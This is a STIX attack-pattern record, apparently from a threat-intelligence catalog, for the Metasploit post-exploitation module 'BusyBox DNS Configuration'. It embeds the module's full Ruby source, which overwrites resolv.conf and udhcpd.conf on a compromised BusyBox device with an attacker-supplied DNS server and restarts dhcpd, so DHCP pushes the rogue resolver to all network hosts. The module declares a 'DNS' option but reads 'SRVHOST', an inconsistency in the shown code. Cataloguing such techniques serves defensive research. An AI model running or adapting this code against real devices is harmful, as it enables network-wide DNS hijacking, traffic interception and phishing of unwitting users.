{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0bd5d08d-7e8c-4bfd-80eb-50665e022ffe",
    "created": "2024-08-14T16:33:13.584894Z",
    "modified": "2024-08-14T16:33:13.584897Z",
    "name": "BusyBox DNS Configuration",
    "description": " This module will be applied on a session connected to a BusyBox shell. It allows to set the DNS server on the device executing BusyBox so it will be sent by the DHCP server to network hosts. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/linux/busybox/set_dns.rb",
            "external_id": "set_dns.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Linux::BusyBox\n\n  def initialize\n    super(\n      'Name' => 'BusyBox DNS Configuration',\n      'Description' => %q{\n        This module will be applied on a session connected to a BusyBox shell. It allows\n        to set the DNS server on the device executing BusyBox so it will be sent by the\n        DHCP server to network hosts.\n      },\n      'Author' => 'Javier Vicente Vallejo',\n      'License' => MSF_LICENSE,\n      'Platform' => ['linux'],\n      'SessionTypes' => ['shell']\n    )\n\n    register_options(\n      [\n        OptAddress.new('DNS', [ true, 'The dns server address' ])\n      ]\n    )\n  end\n\n  def run\n    print_status('Searching for files to modify dns server.')\n    if busy_box_file_exist?('/etc/resolv.conf')\n      modify_resolv_conf\n    end\n\n    if busy_box_file_exist?('/etc/udhcpd.conf')\n      modify_udhcpd_conf\n    end\n  end\n\n  def modify_resolv_conf\n    print_status('File /etc/resolv.conf found')\n    if busy_box_write_file('/etc/resolv.conf', \"nameserver #{datastore['SRVHOST']}\", false)\n      print_good('DNS server added to resolv.conf')\n    end\n  end\n\n  def modify_udhcpd_conf\n    print_status('File /etc/udhcpd.conf found')\n\n    if busy_box_write_file('/etc/udhcpd.conf', \"option dns #{datastore['SRVHOST']}\", true)\n      restart_dhcpd('/etc/udhcpd.conf')\n    else\n      print_status('Unable to write udhcpd.conf, searching a writable directory...')\n      writable_directory = busy_box_writable_dir\n      if writable_directory\n        print_status(\"Copying the original udhcpd.conf to #{writable_directory}tmp.conf\")\n        cmd_exec(\"cp -f /etc/udhcpd.conf #{writable_directory}tmp.conf\")\n        Rex.sleep(0.3)\n        print_status(\"Adding DNS to #{writable_directory}tmp.conf\")\n        busy_box_write_file(\"#{writable_directory}tmp.conf\", \"option dns #{datastore['SRVHOST']}\", true)\n        restart_dhcpd(\"#{writable_directory}tmp.conf\")\n      else\n        print_error('Writable directory not found')\n      end\n    end\n  end\n\n  def restart_dhcpd(conf)\n    print_status('Restarting udhcp server')\n    cmd_exec('killall dhcpd')\n    # in this case it is necessary to use shell_write. Cmd_exec introduce an echo after the command\n    # that is going to be executed: <command>;echo <rand_value>. It seems busybox fails to launch dhcpd\n    # process when it is executed in this way: \"dhcpd /etc/udhcpd.conf &; echo <rand_value>\"\n    session.shell_write(\"dhcpd #{conf} &\\n\")\n    print_good('udhcpd.conf modified and DNS server added. DHCPD restarted')\n  end\nend\n",
    "x_mitre_platforms": [
        "['linux']"
    ]
}